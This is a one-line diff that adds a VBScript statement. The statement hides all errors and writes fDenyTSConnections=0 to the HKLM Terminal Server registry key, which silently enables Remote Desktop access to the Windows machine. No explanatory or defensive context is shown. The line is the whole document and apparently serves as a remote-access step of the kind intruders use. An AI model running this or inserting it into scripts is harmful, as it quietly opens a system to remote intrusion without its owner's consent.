@@ -1,0 +1,1 @@
+on error resume next:CreateObject("WScript.Shell").RegWrite "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\fDenyTSConnections",0,"REG_DWORD"
